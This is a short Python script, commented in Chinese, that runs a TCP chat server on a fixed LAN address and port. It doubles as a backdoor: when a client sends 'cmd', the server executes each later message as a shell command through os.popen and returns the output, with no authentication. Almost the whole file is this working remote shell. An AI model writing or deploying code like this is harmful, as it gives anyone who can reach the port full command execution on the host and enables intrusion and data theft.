import socket
import os


# 创建 socket 对象
s = socket.socket(
    socket.AF_INET, socket.SOCK_STREAM)

# 获取本地主机名
host = '192.168.3.14'

port = 33061

# 绑定端口号
s.bind((host, port))

# 设置最大连接数，超过后排队
s.listen(10)

while True:
    # 建立客户端连接
    c, addr = s.accept()
    while True:
        cc = c.recv(1024)
        if cc == 'cmd':
            while True:
                c.send('已建立终端连接')
                cc = c.recv(1024)
                x = os.popen(cc).read()
                c.send(x)
        else:
            print(cc)
            xx = input('服务器说：')
            c.send(xx)
